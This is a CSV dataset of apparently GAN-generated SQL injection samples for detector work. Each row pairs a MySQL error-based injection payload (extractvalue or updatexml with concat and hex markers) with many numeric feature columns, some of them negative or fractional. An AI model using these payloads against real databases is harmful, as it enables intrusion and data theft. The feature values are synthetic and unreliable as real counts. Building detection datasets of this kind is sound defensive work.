id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000125,6.041180069276171,152.593994140625,44.56071853637695,43.446311950683594,54.169578552246094,1.5372906923294067,50.05723571777344,21.68092918395996,0.7068307995796204,0.2826300859451294,0.19142426550388336,0.34422916173934937,0.11346784234046936,3.743997812271118,0.9812440872192383,1.0818966627120972,0.6908848285675049,0.060775671154260635,0.3754805624485016,0.3504812717437744,4.601225852966309,6.2877912521362305,6.166632652282715,0.3301650583744049,1.758650541305542,0.03640415892004967,0.4533497989177704,0.7238225936889648,-0.5612958669662476,-0.012849660590291023,-0.1525770127773285,-0.08421485126018524,3.1158175468444824,0.3540402352809906,0.5041016936302185,1.787561058998108,3.467886209487915,1.663578987121582,0.4928552210330963,0.14509494602680206,0.41420111060142517,0.7332980632781982,0.14944560825824738,-0.19597254693508148,0.22088275849819183,0.10300956666469574,-0.14551781117916107,0.09880612790584564,-0.2331889420747757,-0.12981177866458893,0.5745488405227661,-0.03762851655483246,-0.431507408618927,0.5887762904167175,-0.08354493230581284,0.5638642311096191,-0.19630515575408936,0.5251405835151672,0.5495300889015198,0.7226815223693848,0.4509025514125824,0.29891809821128845,0.7487828731536865,0.12465421855449677,0.2401071935892105,-0.8285226225852966,0.4913124740123749,-0.18960824608802795,0.9858153462409973,-0.07725273072719574,-0.6811324954032898,0.7378333210945129,1.188049554824829,-0.3242523670196533,0.002415573224425316,0.08216633647680283,1.2602442502975464,0.3259306252002716,0.026895904913544655,-0.009855491109192371,-0.0423029363155365,4.158636569976807,0.2831512689590454,-0.3564854860305786,0.13169708847999573,0.695781409740448,-0.3758760392665863,-0.3458869159221649,1.0366705656051636
GAN_000012,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.2498410791583705,153.0438232421875,41.20890426635742,45.59532928466797,53.51554870605469,0.9110026955604553,45.78592300415039,20.759368896484375,0.41193753480911255,0.2797563374042511,0.19833871722221375,0.3354569673538208,0.11581084877252579,3.7909793853759766,1.0491070747375488,1.12431800365448,0.33774295449256897,-0.004160155542194843,0.3604620397090912,0.5836009979248047,4.465275287628174,5.500326156616211,7.538053035736084,0.3551982045173645,1.8728452920913696,-0.3012208640575409,0.6298083066940308,0.2703121304512024,-0.25216275453567505,-0.03229978680610657,-0.7186297178268433,-0.01270570233464241,4.210163116455078,0.3619159460067749,0.4868710935115814,1.91871178150177,2.922948122024536,2.192354917526245,0.3200024664402008,0.41032448410987854,0.42143911123275757,0.3588016629219055,0.18537229299545288,-0.305896520614624,-0.06231718882918358,-0.11854363977909088,0.34145769476890564,-0.2685289680957794,-0.2527722418308258,-0.5085722804069519,0.5577091574668884,-0.2582818567752838,-0.3553776741027832,0.3903362452983856,-0.41107484698295593,0.5727847814559937,-0.2245204895734787,0.399978369474411,0.575213611125946,1.188089370727539,-0.10351219773292542,0.0941084697842598,0.6852476596832275,0.21682019531726837,0.2779168486595154,-0.2857283651828766,0.6279518604278564,-0.07893790304660797,0.948016345500946,0.054109904915094376,-0.7679781317710876,0.6878021359443665,0.9264745116233826,-0.36538395285606384,0.021541347727179527,0.11053543537855148,1.3306211233139038,0.584071159362793,0.21111829578876495,-0.01591523364186287,0.14262239634990692,5.269041061401367,0.25552356243133545,-0.7104278206825256,0.14613649249076843,0.7185683250427246,-0.6049649715423584,-0.74673992395401,0.726578414440155
GAN_000013,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.2447508445734154,149.8372344970703,42.26670837402344,40.6574592590332,57.4165153503418,2.3791348934173584,44.82075119018555,20.056583404541016,0.6928043365478516,0.2869773507118225,0.19187021255493164,0.35439789295196533,0.11713879555463791,3.7233169078826904,1.3844267129898071,1.1132289171218872,0.5090514421463013,0.13696663081645966,0.33217939734458923,0.34917011857032776,4.496601581573486,6.311248302459717,5.9965386390686035,0.5839695334434509,1.622598648071289,0.1405211091041565,0.32553088665008545,0.507347047328949,-0.24524903297424316,-0.002788789104670286,-0.2692570090293884,-0.11268030107021332,2.9920284748077393,-0.1829521656036377,0.5339483618736267,1.6566243171691895,3.419459581375122,1.1257824897766113,0.9175035953521729,0.3997618854045868,0.4031766355037689,0.28905990719795227,0.030128024518489838,-0.23306341469287872,0.2671635150909424,-0.45879459381103516,-0.3830956220626831,0.10246948897838593,-0.05570955574512482,0.0015158805763348937,0.501885175704956,0.008572027087211609,-0.5286526679992676,0.45192238688468933,-0.1763480007648468,0.3799261450767517,-0.1038825735449791,0.5411853194236755,0.5658908486366272,0.485471248626709,0.01853446662425995,0.39761650562286377,0.48909977078437805,0.06692318618297577,0.3453991413116455,-0.5742977857589722,0.459720641374588,-0.23631125688552856,0.4382469058036804,0.22737903892993927,-0.4491783082485199,0.5864638090133667,0.7783887982368469,-0.36657479405403137,0.015052356757223606,0.07318902760744095,0.9581440687179565,0.3958379030227661,-0.13309849798679352,-0.01521881390362978,-0.05768439918756485,5.218276500701904,0.35906389355659485,-0.3396177887916565,0.1830742061138153,0.7585598230361938,-0.5024605989456177,-0.5394177436828613,0.5339828133583069
GAN_000014,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,6.139883417616807,149.56671142578125,50.28460693359375,40.157535552978516,56.771507263183594,4.069524765014648,48.97500991821289,21.750736236572266,1.090746283531189,0.3063202500343323,0.17327213287353516,0.35836079716682434,0.10973465442657471,3.6893858909606934,0.9732809066772461,0.7808268070220947,0.8737199902534485,0.12990489602088928,0.20945294201374054,0.3225730061531067,4.737804412841797,6.7177228927612305,5.404890537261963,0.38178038597106934,1.6730574369430542,0.1358877569437027,0.1509331315755844,0.701794445514679,-0.7722726464271545,-0.009976550936698914,0.12838363647460938,-0.21438103914260864,2.2500128746032715,0.2328135371208191,0.5509081482887268,1.5922757387161255,3.5601940155029297,1.3195931911468506,0.773089587688446,-0.2976701855659485,0.38938382267951965,0.6538259387016296,0.02287759818136692,-0.05202117934823036,0.327993780374527,-0.1622427999973297,-0.2754709720611572,0.15845367312431335,-0.009738996624946594,-0.021876022219657898,0.5879318714141846,0.0407063364982605,-0.6439778804779053,0.6925088763237,0.08273840695619583,0.3425363302230835,-0.38029980659484863,0.9855043292045593,0.42579185962677,0.4597634971141815,0.6310102939605713,0.2393684685230255,0.3476546108722687,0.045376166701316833,0.3371254801750183,-1.0801875591278076,0.39735153317451477,-0.6334434151649475,0.9624181389808655,0.08181893825531006,-0.4942823052406311,0.6361318230628967,1.3315656185150146,-0.37176182866096497,0.006841990631073713,0.09769749641418457,1.076878547668457,0.18957971036434174,-0.07820162922143936,-0.02626180276274681,-0.2486238181591034,5.0666584968566895,0.1528366059064865,-0.26885297894477844,0.2537424862384796,0.642974853515625,-0.6179589033126831,-0.4155355989933014,0.6503466367721558
GAN_000015,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,5.271361151724223,151.36984252929688,47.31898880004883,33.512718200683594,54.17965316772461,2.9432435035705566,47.4285774230957,19.311880111694336,0.8258558511734009,0.32283493876457214,0.17847438156604767,0.3573947250843048,0.11049453914165497,3.7405498027801514,0.6568187475204468,0.4962405562400818,0.60456383228302,0.09749854356050491,0.3331354558467865,0.3970068097114563,4.466283321380615,5.5193071365356445,6.164080619812012,0.3184865713119507,1.9836279153823853,0.08327532559633255,0.20155099034309387,0.3196393847465515,-0.27997350692749023,0.004504459444433451,-0.15284059941768646,-0.01871260069310665,3.2409119606018066,-0.09156007319688797,0.5512194037437439,1.3899623155593872,3.1273210048675537,1.3409734964370728,0.7827627062797546,-0.14213572442531586,0.35659724473953247,0.4268541932106018,-0.039168037474155426,-0.07479556649923325,0.09197568893432617,-0.2327774614095688,0.10972893238067627,0.08792838454246521,0.16480445861816406,-0.04302729666233063,0.41322484612464905,0.14343523979187012,-0.32209259271621704,0.6334481239318848,0.12083837389945984,0.5877597332000732,-0.6111205220222473,0.33708494901657104,0.535863995552063,0.2555210590362549,-0.08597239851951599,0.050657495856285095,0.36774638295173645,-0.09875937551259995,0.3583783507347107,-0.7552717924118042,0.5985027551651001,-0.03268437087535858,0.7684617638587952,-0.08523468673229218,-0.4539205729961395,0.06422736495733261,0.8964020609855652,-0.346129834651947,0.015495051629841328,0.07276789844036102,1.1217715740203857,0.3001369833946228,-0.008965518325567245,-0.014294345863163471,-0.1693037450313568,4.946316242218018,0.2120867222547531,-0.37167859077453613,0.19051732122898102,0.7838018536567688,-0.575036346912384,-0.370995432138443,0.23729395866394043
GAN_000016,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,4.9268728684387995,155.47300720214844,42.79917907714844,40.4307975769043,55.89735412597656,2.1366615295410156,43.57868576049805,20.951868057250977,0.8939512372016907,0.2705042362213135,0.21720290184020996,0.3451666831970215,0.12575893104076385,3.774930000305176,0.8784046769142151,0.8110230565071106,0.4877508878707886,0.06507446616888046,0.3218684792518616,0.2793790400028229,4.463825225830078,5.832792282104492,5.468915939331055,0.19296148419380188,1.5201338529586792,-0.19804681837558746,0.40692412853240967,0.5132710337638855,-0.34151691198349,-0.04047362878918648,-0.27257466316223145,-0.10259142518043518,3.1521480083465576,0.1899319291114807,0.3960137367248535,1.7073519229888916,3.6778359413146973,1.4648432731628418,0.7564753890037537,0.16917069256305695,0.320406973361969,0.42891213297843933,-0.013296088203787804,-0.2173207551240921,-0.011928105726838112,-0.07536642253398895,-0.07912863790988922,0.10139811038970947,-0.08246879279613495,-0.13661237061023712,0.4826672375202179,-0.06888438761234283,-0.37424570322036743,0.47042718529701233,-0.11221300810575485,-0.006845499388873577,-0.0217569749802351,0.3054454028606415,0.3579113781452179,0.5135254263877869,0.3872014880180359,0.17380301654338837,0.49371811747550964,0.10369360446929932,0.14570407569408417,-0.4746665358543396,0.7219974994659424,-0.337905615568161,0.3611355125904083,0.06601822376251221,-0.5114028453826904,0.8475770354270935,0.623940110206604,-0.3836030960083008,0.007924278266727924,0.0490402951836586,1.0362803936004639,0.4137829840183258,-0.1940322369337082,0.011576241813600063,-0.10337405651807785,4.823873996734619,0.3396826386451721,-0.571021318435669,0.13769863545894623,0.7084785103797913,-0.3652133047580719,-0.5158666372299194,0.5053897500038147
GAN_000017,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",nearest_attack_euclidean,R000010,5.460175672465351,155.2431182861328,44.685523986816406,41.57332992553711,57.361019134521484,3.5831596851348877,43.45625305175781,21.678449630737305,0.9807893633842468,0.27465856075286865,0.20348776876926422,0.34442541003227234,0.12344363331794739,3.753687620162964,0.8923810124397278,0.635403037071228,0.4552934467792511,0.1688021570444107,0.2274986207485199,0.25992098450660706,4.447452545166016,5.962117671966553,5.421852111816406,0.3424650728702545,1.6437231302261353,-0.343609094619751,0.5194993615150452,0.5739454030990601,-0.48249924182891846,-0.03352619707584381,-0.21288041770458221,-0.14993688464164734,2.985063076019287,0.21564072370529175,0.42734116315841675,1.6417268514633179,3.587374687194824,1.5420050621032715,0.6872262358665466,0.15232831239700317,0.40049079060554504,0.3062017261981964,0.03631937876343727,-0.15926416218280792,0.021503865718841553,-0.3452875316143036,-0.053224992007017136,0.09256529808044434,-0.10530166327953339,-0.21994800865650177,0.5377628803253174,-0.08833925426006317,-0.4317523241043091,0.4317885637283325,-0.12995296716690063,-0.01894487626850605,-0.1630859076976776,0.6114891767501831,0.22235962748527527,0.5436788201332092,0.4393329918384552,0.1976831704378128,0.3315456211566925,0.21342988312244415,0.2965443730354309,-0.7020581364631653,0.6558135151863098,-0.45543843507766724,0.5346618294715881,0.03999447450041771,-0.500587522983551,1.0478928089141846,0.9508524537086487,-0.3643413484096527,0.01573103293776512,0.07124674320220947,0.9621305465698242,0.45006558299064636,-0.09917879849672318,-0.010284957475960255,0.12155753374099731,5.569937705993652,0.1613926887512207,-0.5236321091651917,0.1538703590631485,0.7409466505050659,-0.47070834040641785,-0.6616988182067871,0.35892003774642944
GAN_000018,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.676544983681566,152.1873779296875,41.043434143066406,41.28532409667969,54.180294036865234,2.2383530139923096,45.298851013183594,20.459495544433594,0.704082190990448,0.25974783301353455,0.22507472336292267,0.34548231959342957,0.12537339329719543,3.687671184539795,1.1411017179489136,0.6915534138679504,0.6107247471809387,-0.005761479027569294,0.36334505677223206,0.6273642182350159,4.274345397949219,5.478521823883057,6.801509380340576,0.25101369619369507,1.856871485710144,-0.29370829463005066,0.4531567692756653,0.5775057077407837,-0.4025254249572754,-0.04989127814769745,-0.4261534810066223,-0.15909498929977417,3.7294678688049316,-0.13351625204086304,0.41151347756385803,1.8578839302062988,3.5184109210968018,1.5088226795196533,0.3997219502925873,0.6170393228530884,0.3847706913948059,0.66118985414505,0.019888687878847122,-0.23404760658740997,-0.2572404742240906,-0.24488118290901184,-0.16249245405197144,0.06463339924812317,-0.05312560498714447,-0.28153011202812195,0.548698365688324,-0.03784261643886566,-0.7801287174224854,0.4307403564453125,-0.221492737531662,0.2895122468471527,-0.3385772705078125,0.7011656165122986,0.52519291639328,0.5223224759101868,0.12680546939373016,0.2723000645637512,0.5251504182815552,-0.24721331894397736,0.14457586407661438,-0.6167922616004944,0.7066386938095093,-0.2542164921760559,0.4660542607307434,0.07624723017215729,-0.6605910062789917,0.8073917031288147,0.8260733485221863,-0.6148515939712524,0.02504572831094265,0.061591263860464096,1.0651761293411255,0.43281036615371704,-0.012030163779854774,0.014251100830733776,0.11280053108930588,4.621140480041504,0.18328885734081268,-0.7761908769607544,0.25376129150390625,0.7540228962898254,-0.539537787437439,-0.652940571308136,0.421450674533844
GAN_000019,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.423036493387186,153.39776611328125,38.57697677612305,47.334129333496094,52.53152084350586,1.0020822286605835,44.978267669677734,21.1144962310791,0.5175231099128723,0.24281878769397736,0.2232929915189743,0.33362606167793274,0.12253456562757492,3.7384817600250244,0.7452278733253479,0.7862923741340637,0.5401619076728821,-0.14801859855651855,0.5181465744972229,0.672772228717804,4.1896772384643555,5.160784721374512,8.160734176635742,0.43746668100357056,2.1271631717681885,-0.31359970569610596,0.7882986068725586,0.5813312530517578,-0.2150707095861435,-0.03289179503917694,-0.7250654101371765,-0.129216730594635,4.725481033325195,0.1781632900238037,0.33901092410087585,2.068601608276367,3.5129685401916504,2.371772527694702,0.36072006821632385,0.35334980487823486,0.40683573484420776,0.493186891078949,-0.0027357456274330616,-0.41402900218963623,-0.3176101744174957,0.018237058073282242,0.2907983660697937,-0.06729395687580109,-0.03798858821392059,-0.5164641737937927,0.6180906891822815,-0.2801840603351593,-0.411918044090271,0.6538577675819397,-0.4209173023700714,0.26408714056015015,-0.33350279927253723,0.47698524594306946,0.5137454867362976,1.1323864459991455,0.1017213761806488,0.026400644332170486,0.8970314264297485,-0.15863582491874695,0.1002868264913559,-0.45804256200790405,0.6714905500411987,0.08870396018028259,0.6582390666007996,0.051513317972421646,-0.6581061482429504,0.9538959860801697,0.9049376249313354,-0.3724934756755829,0.019898416474461555,0.07575754821300507,1.4530346393585205,0.5530351400375366,0.08432552963495255,0.10541998594999313,-0.0323023721575737,3.5652027130126953,0.24127653241157532,-0.8564086556434631,0.10316038131713867,0.7703505754470825,-0.8567636609077454,-0.8144996166229248,0.6023486852645874
GAN_000020,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.559175363528267,156.12681579589844,41.4891357421875,42.675811767578125,54.66718292236328,2.7041847705841064,44.81711196899414,21.36073112487793,0.913823664188385,0.254927396774292,0.2221497893333435,0.33954980969429016,0.12501515448093414,3.7263643741607666,0.4918630123138428,0.5830079317092896,0.6504619121551514,0.02336227521300316,0.42499539256095886,0.49469974637031555,4.249271869659424,5.676090717315674,6.177178382873535,0.20695392787456512,1.874631404876709,-0.21273116767406464,0.6893982291221619,0.5966849327087402,-0.3618830144405365,-0.03242569789290428,-0.1914733499288559,-0.1586052030324936,3.949336528778076,0.2193501591682434,0.29245853424072266,1.77365243434906,3.5636472702026367,1.740917444229126,0.4909631907939911,0.1485147476196289,0.3900689482688904,0.6072334051132202,0.03316938877105713,-0.22976116836071014,-0.056504592299461365,0.06411901116371155,-0.23390886187553406,0.07463163137435913,-0.12612570822238922,-0.2850411832332611,0.5747662782669067,-0.24558000266551971,-0.4972914457321167,0.6099202632904053,-0.22944995760917664,-0.012655227445065975,-0.1442975103855133,0.43713510036468506,0.35119369626045227,0.5646010041236877,0.47546255588531494,0.15448340773582458,0.8693336248397827,-0.08133842796087265,0.04921421408653259,-0.6918431520462036,0.7244517803192139,-0.235178142786026,0.5908374786376953,0.021603871136903763,-0.5732906460762024,0.8882525563240051,0.7550234198570251,-0.45904457569122314,0.01801898330450058,0.0631510317325592,1.222885251045227,0.49294015765190125,-0.22552859783172607,0.054670464247465134,0.03712005913257599,4.197969913482666,0.3678346574306488,-0.8151591420173645,0.1650264859199524,0.738932728767395,-0.4476725459098816,-0.6303215622901917,0.38521796464920044
GAN_000021,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000125,5.076293144216934,153.71466064453125,45.437461853027344,38.57489013671875,56.64750671386719,3.8198859691619873,44.6253776550293,20.155061721801758,0.7526299953460693,0.28555920720100403,0.19782359898090363,0.3485487103462219,0.11596709489822388,3.746962547302246,1.1287018060684204,0.5735827684402466,0.6647352576255798,0.12559948861598969,0.3842891454696655,0.2357979565858841,4.572693824768066,6.099700450897217,5.934828758239746,0.33239296078681946,1.7963565587997437,-0.01966986432671547,0.28685951232910156,0.5489582419395447,-0.32463642954826355,-0.004424090962857008,-0.07979540526866913,-0.16451141238212585,2.807089328765869,0.2460959553718567,0.608031153678894,1.5806288719177246,3.647758722305298,1.2683528661727905,0.7622741460800171,0.10249476134777069,0.3478911519050598,0.3565560281276703,0.17163459956645966,-0.17320607602596283,0.15159890055656433,-0.16173721849918365,-0.2738837003707886,0.1156800240278244,0.058490827679634094,-0.0676579624414444,0.5561922192573547,0.1175503134727478,-0.4378544092178345,0.4982362389564514,-0.22867566347122192,0.10604937374591827,-0.13140587508678436,0.31919726729393005,0.489888995885849,0.23339241743087769,0.17608284950256348,0.3333664834499359,0.4041532576084137,-0.08380258083343506,0.3035496473312378,-0.6827999353408813,0.6246233582496643,-0.19513916969299316,0.5592541098594666,0.1680229753255844,-0.5871209502220154,0.6930383443832397,0.9941109418869019,-0.3308338224887848,0.023924510926008224,0.056459978222846985,1.1024502515792847,0.29416224360466003,0.053139008581638336,-0.0029621876310557127,0.14187638461589813,5.092506408691406,0.10460945963859558,-0.15344402194023132,0.09286776930093765,0.6867109537124634,-0.27464354038238525,-0.3256163001060486,0.4806478023529053
GAN_000022,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.488750991031943,145.69398498535156,42.811988830566406,41.00153350830078,56.305789947509766,1.6262450218200684,44.340946197509766,20.403034210205078,0.6643758416175842,0.2930155098438263,0.17744721472263336,0.35972967743873596,0.11097341775894165,3.701786994934082,1.4694972038269043,1.4015254974365234,0.552840530872345,0.24376912415027618,0.20113308727741241,-0.05687984824180603,4.633584022521973,6.281268119812012,5.775723457336426,0.7023071646690369,1.536538004875183,-0.03609137237071991,0.08773690462112427,0.5156012773513794,-0.19742237031459808,0.0023100757971405983,-0.3515862226486206,0.027614712715148926,2.6912038326263428,-0.048505835235118866,0.7059161067008972,1.830565094947815,3.2023894786834717,1.1457445621490479,0.9576867818832397,0.2779933512210846,0.42138180136680603,0.1645752489566803,0.2688910961151123,-0.13514544069766998,0.20872603356838226,-0.3927959203720093,-0.2247699797153473,0.08190448582172394,-0.015591755509376526,0.07647338509559631,0.416443407535553,0.15288929641246796,-0.5030773282051086,0.3665546774864197,-0.3370373547077179,0.7550035119056702,-0.48924940824508667,0.5176684856414795,0.7080680131912231,0.4141228199005127,0.0861520916223526,0.630861759185791,0.16275173425674438,0.4038412570953369,0.49173682928085327,-0.49533823132514954,0.4244275391101837,-0.4513053894042969,0.5234513282775879,0.15119001269340515,-0.4406949579715729,0.39387717843055725,1.0887094736099243,-0.30828309059143066,0.0036325883120298386,0.06759756803512573,0.9016417860984802,0.3463544249534607,0.24256686866283417,-0.026810210198163986,0.15847396850585938,5.693900108337402,0.11230206489562988,-0.1904928982257843,0.1341983675956726,0.8288636207580566,-0.47417575120925903,-0.4975737929344177,0.680427074432373
GAN_000023,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.655499847165752,152.88844299316406,37.20317077636719,48.06745910644531,53.23250198364258,-0.8081470131874084,40.446231842041016,22.220272064208984,0.8504027128219604,0.2420504093170166,0.2348003089427948,0.34166112542152405,0.12915411591529846,3.7202694416046143,0.937833309173584,0.9484899044036865,0.3773892819881439,-0.06175275519490242,0.4125244915485382,0.21891041100025177,4.089484691619873,5.020764350891113,6.703908443450928,0.5548551082611084,1.6720086336135864,-0.1346317082643509,0.7209823131561279,0.6146897077560425,-0.09811319410800934,-0.046695854514837265,-0.714377224445343,0.3048942983150482,4.227540969848633,0.15882155299186707,0.22664374113082886,2.184291362762451,3.5963990688323975,1.8747808933258057,0.7089304327964783,0.14944963157176971,0.39517855644226074,0.2885833978652954,0.05995806306600571,-0.33176755905151367,-0.23742161691188812,0.09557479619979858,0.2902480363845825,0.09788087010383606,-0.05229853093624115,-0.29573962092399597,0.5285007357597351,-0.19626806676387787,-0.47442227602005005,0.4333430826663971,-0.25467661023139954,0.16203585267066956,-0.49749231338500977,0.30343058705329895,0.510810136795044,0.950365424156189,0.295543372631073,0.27539512515068054,0.651034951210022,0.05532676726579666,0.1311631202697754,-0.25296714901924133,0.5281872749328613,-0.2547595798969269,0.32997485995292664,-0.10483227670192719,-0.45745348930358887,0.6808398962020874,0.6177307367324829,-0.22079168260097504,-0.005113021936267614,0.048989519476890564,1.3320505619049072,0.5700911283493042,-0.029825948178768158,0.12052398175001144,-0.08138732612133026,3.349696397781372,0.2862481474876404,-0.8717995882034302,0.11683928221464157,0.8259246349334717,-0.8650433421134949,-0.9598004221916199,0.7029785513877869
